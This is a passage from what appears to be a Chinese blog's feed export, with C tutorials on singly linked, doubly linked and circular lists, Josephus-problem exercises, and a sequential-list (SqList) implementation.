class="comment">//写入节点数据</span></span><br><span class="line">temp-&gt;next = p;                  <span class="comment">//连接结点</span></span><br><span class="line">temp = p;                        <span class="comment">//移动头指针</span></span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>头插法创建链表<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_L</span><span class="params">(LinkList&amp; L, <span class="type">int</span> n)</span> &#123;          <span class="comment">//头插发创建链表</span></span><br><span class="line">L = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));     <span class="comment">//创建头结点</span></span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">LinkList p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));<span class="comment">//创建结点</span></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p-&gt;data);            <span class="comment">//写入节点数据</span></span><br><span class="line">p-&gt;next = L-&gt;next;                <span class="comment">//连接结点</span></span><br><span class="line">L-&gt;next = p;                      <span class="comment">//移动头指针</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ol><li><p>节点的插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListInsert_L</span><span class="params">(LinkList&amp; L, <span class="type">int</span> i, ElemType e)</span> &#123;  </span><br><span class="line">LinkList temp = L;           <span class="comment">//创建指针指向头结点  用于遍历</span></span><br><span class="line"><span class="type">int</span> j ;</span><br><span class="line"><span class="keyword">for</span> (j=<span class="number">1</span>; j &lt; i; ++j) &#123;      <span class="comment">//遍历找到要插入的前一个结点</span></span><br><span class="line"><span class="keyword">if</span> (temp == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!temp || j &gt; i)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">LinkList p = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));<span class="comment">//申请插入节点的空间</span></span><br><span class="line">p-&gt;data = e;</span><br><span class="line">p-&gt;next = temp-&gt;next;</span><br><span class="line">temp-&gt;next = p;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>结点的删除<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6cc4ypfd1j30jg04c3ze.jpg" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListDelete_L</span><span class="params">(LinkList&amp; L, <span class="type">int</span> i,ElemType e)</span> &#123;  </span><br><span class="line">LinkList temp = L;           <span class="comment">//创建指针指向头结点  用于遍历</span></span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; i; ++j)      <span class="comment">//遍历找到要插入的前一个结点</span></span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (!(temp-&gt;next) || j &gt; i)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">LinkList del = temp-&gt;next;   <span class="comment">//创建指针保存删除的结点</span></span><br><span class="line">temp-&gt;next = del-&gt;next;</span><br><span class="line">e = temp-&gt;data;</span><br><span class="line"><span class="built_in">free</span>(del);                   <span class="comment">//释放要删除结点的空间</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>单链表的输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printList</span><span class="params">(LinkList p)</span> &#123;</span><br><span class="line">LinkList temp = p;       <span class="comment">//将temp指针重新指向头结点</span></span><br><span class="line"><span class="comment">//要temp指针指向的结点的next不是Null，就执行输出语句。</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The LinkList is:\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (temp-&gt;next) &#123;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, temp-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>主函数实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, i, e, j, h;</span><br><span class="line">LinkList p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the linklist:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the linklist:\n&quot;</span>);</span><br><span class="line">CreateList_L(p, n);</span><br><span class="line">printList(p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the position to insert:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the elements:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">ListInsert_L(p, i, e);</span><br><span class="line">printList(p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nPlease input the position to delete:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;j);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input the elements:\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;h);</span><br><span class="line">ListDelete_L(p, j, h);</span><br><span class="line">printList(p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>结果展示</strong><br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6cb31lrp8j30gd0audjg.jpg" alt="image.png"></li></ul><h4 id="单链表完整代码地址"><a href="#单链表完整代码地址" class="headerlink" title="单链表完整代码地址"></a><a href="http:\\chalnl.com\code\linklist.cpp">单链表完整代码地址</a></h4><h3 id="二-双向列表"><a href="#二-双向列表" class="headerlink" title="二. 双向列表"></a>二. 双向列表</h3><ul><li><strong>在学会单链表的前提下，双向链表简直不要太简单。</strong></li></ul><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6avwjrfcwj30go02cjrj.jpg" alt="image.png"></p><ol><li>指针域：用于指向当前节点的直接前驱节点；</li><li>数据域：用于存储数据元素。</li><li>指针域：用于指向当前节点的直接后继节点；<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6avx0jodpj307k01jdg2.jpg" alt="image.png"></li></ol><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span> &#123;</span></span><br><span class="line">ElemType data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">prior</span>;</span>  <span class="comment">//指向直接前趋</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DuLNode</span>* <span class="title">next</span>;</span>   <span class="comment">//指向直接后继</span></span><br><span class="line">&#125;DuLNode,*DuLLinkList;</span><br></pre></td></tr></table></figure></li><li><p>双向链表的创建（尾插发）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_DuL</span><span class="params">(DuLLinkList&amp; L, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">L = (DuLLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DuLNode));</span><br><span class="line">L-&gt;next = <span class="literal">NULL</span>;                    </span><br><span class="line">DuLLinkList temp = L; </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">DuLLinkList p = (DuLLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DuLNode));</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p-&gt;data);</span><br><span class="line">temp-&gt;next = p; </span><br><span class="line">temp-&gt;next-&gt;prior = temp;</span><br><span class="line">temp = p; </span><br><span class="line">&#125;</span><br><span class="line">temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>双向链表中结点的插入<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6j1h2c3tfj30fa051q3b.jpg" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListInsert_DuL</span><span class="params">(DuLLinkList&amp; L, <span class="type">int</span> i, ElemType e)</span> &#123;</span><br><span class="line">DuLLinkList temp = L;</span><br><span class="line"><span class="type">int</span> j ;</span><br><span class="line"><span class="keyword">for</span> (j=<span class="number">1</span>; j &lt; i; ++j) &#123;</span><br><span class="line"><span class="keyword">if</span> (temp == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!temp || j &gt; i)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">DuLLinkList p = (DuLLinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DuLNode));</span><br><span class="line">p-&gt;data = e;</span><br><span class="line">p-&gt;prior = temp;</span><br><span class="line">p-&gt;next = temp-&gt;next;</span><br><span class="line">temp-&gt;next-&gt;prior = p;</span><br><span class="line">temp-&gt;next = p;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>双向链表中结点的删除<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6j1g93unmj30go0310t6.jpg" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListDelete_DuL</span><span class="params">(DuLLinkList&amp; L, <span class="type">int</span> i,ElemType e)</span> &#123;</span><br><span class="line">DuLLinkList temp = L;</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">1</span>; j &lt; i; ++j) </span><br><span class="line">temp = temp-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (!(temp-&gt;next) || j &gt; i)</span><br><span class="line"><span class="keyword">return</span> ERROR;</span><br><span class="line">DuLLinkList del = temp-&gt;next;</span><br><span class="line">temp-&gt;next-&gt;next-&gt;prior = temp;</span><br><span class="line">temp-&gt;next = temp-&gt;next-&gt;next;</span><br><span class="line">e = del-&gt;data;</span><br><span class="line"><span class="built_in">free</span>(del);</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>结果展示</strong><br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6j0wjvhi2j30g90aogpe.jpg" alt="image.png"></li></ul><h4 id="双向链表完整代码地址"><a href="#双向链表完整代码地址" class="headerlink" title="双向链表完整代码地址"></a><a href="http:\\chalnl.com\code\DulLinklist.cpp">双向链表完整代码地址</a></h4><h3 id="三-循环列表"><a href="#三-循环列表" class="headerlink" title="三. 循环列表"></a>三. 循环列表</h3><p>循环链表只需要将表中最后一个结点的指针指向头结点，链表就能成环儿<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h69muhpt7kj310y08bjsc.jpg" alt="image.png"></p><ul><li><p>循环链表解决<strong>约瑟夫环</strong>问题<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h6cc7lw0ooj30b40950t0.jpg" alt="image.png"></p></li><li><ol><li><a href="http:\\chalnl.com\code\linklist1.cpp">猴子选大王</a><blockquote><p>有 n 只猴子围成一圈，从 1 - n 编号，大家决定从中选出一个大王。经过协商，决定选大王的规则为：从编号为1的猴子开始报数，报到 k 的猴子出圈，然后再从下一只开始继续报 1 到 k ……，最后剩下来的那一只就是大王。要求编程从键盘输入 n、k ，输出成为大王的猴子编号。</p></blockquote></li></ol></li><li><ol><li><a href="http:\\chalnl.com\code\linklist2.cpp">约瑟夫杯2</a><blockquote><p>围绕着山顶有10个圆形排列的洞，狐狸要吃兔子，兔子说：“可以，但必须先找到我，我就藏身于这十个洞中的某个洞。你从1号洞找，下次隔1个洞（即3号洞）找，第三次隔2个洞（即6号洞）找，再隔3个…以后在这个圆圈中如此类推，次数不限。”但狐狸从早到晚进进出出了1000次，仍没有找到兔子。问：兔子可能在哪个洞里？编写程序找出。</p></blockquote></li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="http://chalnl.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://chalnl.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="C语言" scheme="http://chalnl.com/tags/C%E8%AF%AD%E8%A8%80/"/>
    
    <category term="线性表" scheme="http://chalnl.com/tags/%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>数据结构之顺序表 - SqList</title>
    <link href="http://chalnl.com/post/91054329.html/"/>
    <id>http://chalnl.com/post/91054329.html/</id>
    <published>2022-09-16T16:00:00.000Z</published>
    <updated>2022-10-04T09:41:42.734Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="线性表的顺序存储结构"><a href="#线性表的顺序存储结构" class="headerlink" title="线性表的顺序存储结构"></a>线性表的顺序存储结构</h1><ul><li><strong>线性表（List）：零个或多个数据元素的有限序列</strong><br>线性表中的每一个元素有且<strong>只有一个直接前驱元素</strong>，除了最后一个元素an外，每一个元素有且<strong>只有一个直接后继元素</strong>。数据元素之间的关系是<strong>一对一的关系</strong>。</li></ul><p><img src="https://img-blog.csdnimg.cn/20210106171800118.png#pic_center" alt="img"></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul><li>typedef struct 解释详解<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span>                  <span class="comment">//类型定义，给结构体定义一个名字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span>                   //结构体定义</span></span><br><span class="line"><span class="class"><span class="title">typedef</span> <span class="keyword">struct</span>           //使用这个结构体方便</span></span><br><span class="line"><span class="class"><span class="title">typedef</span> <span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> elem;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;NODE;                   <span class="comment">//定义结构体</span></span><br></pre></td></tr></table></figure></li><li>malloc()函数<blockquote><p>malloc（）是动态内存分配函数，用来向系统请求分配内存空间</p></blockquote></li></ul><h2 id="顺序表"><a href="#顺序表" class="headerlink" title="顺序表"></a>顺序表</h2><ol><li><strong>概念</strong>：用一组<strong>地址连续</strong>的存储单元依次存储线性表的数据元素，这种存储结构的线性表称为顺序表。</li><li><strong>特点</strong>：逻辑上相邻的数据元素，物理次序也是相邻的</li></ol><p>线性表的顺序存储结构是一种随机存取的储存结构</p><h3 id="顺序表时间复杂度"><a href="#顺序表时间复杂度" class="headerlink" title="顺序表时间复杂度"></a>顺序表时间复杂度</h3><p>从以上代码可以很明显的看出，线性表的顺序存储结果在读、存数据是的时间复杂度是<strong>O(1)</strong>，<strong>插入、删除</strong>操作的时间复杂度是<strong>O(n)</strong>。</p><h3 id="顺序表的优缺点"><a href="#顺序表的优缺点" class="headerlink" title="顺序表的优缺点"></a>顺序表的优缺点</h3><ol><li><p><strong>优点</strong>：无须为表中元素之间的逻辑关系而增加额外的存储空间；<strong>可以快速的存取表中任一位置的元素</strong>。</p></li><li><p><strong>缺点</strong>：插入和删除操作需要移动大量元素；当线性表长度较大时，难以确定存储空间的容量；造成存储空间的“碎片”。</p></li></ol><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><ol><li><p>结构体定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>      <span class="comment">//顺序表数据结构</span></span><br><span class="line">    ElemType* elem;</span><br><span class="line">    <span class="type">int</span> length;      <span class="comment">//记录当前顺序表的长度</span></span><br><span class="line">    <span class="type">int</span> listsize;    <span class="comment">//记录顺序表的存储容量</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure></li><li><p>初始化线性表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">status <span class="title function_">InitList</span><span class="params">(SqList&amp; L)</span>&#123;</span><br><span class="line">    <span class="comment">//构造一个空的顺序表，动态申请存储空间</span></span><br><span class="line">    L.elem = (ElemType*)<span class="built_in">malloc</span>(LIST_INIT_SIZE * <span class="keyword">sizeof</span>(ElemType)); </span><br><span class="line">    <span class="comment">//如果申请失败，作出提示并直接退出程序  </span></span><br><span class="line">    <span class="keyword">if</span> (!L.elem) <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">    <span class="comment">//空表的长度初始化为0</span></span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    L.listsize = LIST_INIT_SIZE;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>线性表元素的插入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">status <span class="title function_">ListInsert_Sq</span><span class="params">(SqList&amp; L, <span class="type">int</span> i, ElemType e)</span>&#123;</span><br><span class="line">    ElemType* newbase, * p, * q;</span><br><span class="line">    <span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L.length + <span class="number">1</span>) </span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">if</span> (L.length &gt;= L.listsize)&#123;</span><br><span class="line">        newbase = (ElemType*)<span class="built_in">realloc</span>(L.elem, </span><br><span class="line">            (L.listsize + LISTINCREMENT) * <span class="keyword">sizeof</span>(ElemType));</span><br><span class="line">        <span class="keyword">if</span> (!newbase) </span><br><span class="line">            <span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">        L.elem = newbase;</span><br><span class="line">        L.listsize = L.listsize + LISTINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    q = &amp;(L.elem[i - <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">for</span> (p = &amp;(L.elem[L.length - <span class="number">1</span>]); p &gt;= q; --p) </span><br><span class="line">        *(p + <span class="number">1</span>) = *p;</span><br><span class="line">    *q = e;</span><br><span class="line">    L.length++;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>线性表元素的删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">status <span class="title function_">ListDelete_Sq</span><span class="params">(SqList&amp; L, <span class="type">int</span> i, ElemType&amp; e)</span>&#123;</span><br><span class="line">    ElemType* p, * q;</span><br><span class="line">    <span class="keyword">if</span> ((i &lt; <span class="number">1</span>) || i &gt; L.length)</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    p = &amp;L.elem[i - <span class="number">1</span>];</span><br><span class="line">    e = *p;</span><br><span class="line">    q = L.elem + L.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (++p; p &lt;= q; ++p)</span><br><span class="line">        *(p - <span class="number">1</span>) = *p;</span><br><span class="line">    --L.length;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>线性表元素的输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">status <span class="title function_">printList</span><span class="params">(SqList L)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The SqList is:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; L.length; ++i)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %d  &quot;</span>, L.elem[i]);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>主函数的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    SqList L;</span><br><span class="line">    <span class="type">int</span> n, i, elem, e, a, j;</span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the length of the sqlist:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the element of the sqlist:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; ++i)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;elem);</span><br><span class="line">        ListInsert_Sq(L, i, elem);</span><br><span class="line">    &#125;</span><br><span class="line">    printList(L);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nPlease input the position to insert:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the elements:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">    ListInsert_Sq(L, i, e);</span><br><span class="line">    printList(L);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nPlease input the length to delete the size of sqlist:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input the place to deldte size:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= a; ++j)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">        ListDelete_Sq(L, <span class="number">1</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    printList(L);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>结果展示</strong><br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h69pb03qfqj30ij09utci.jpg" alt="image.png"></li></ul><h3 id="SqList-完整代码地址"><a href="#SqList-完整代码地址" class="headerlink" title="SqList 完整代码地址"></a><a href="http:\\chalnl.com\code\sqlist.cpp">SqList 完整代码地址</a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
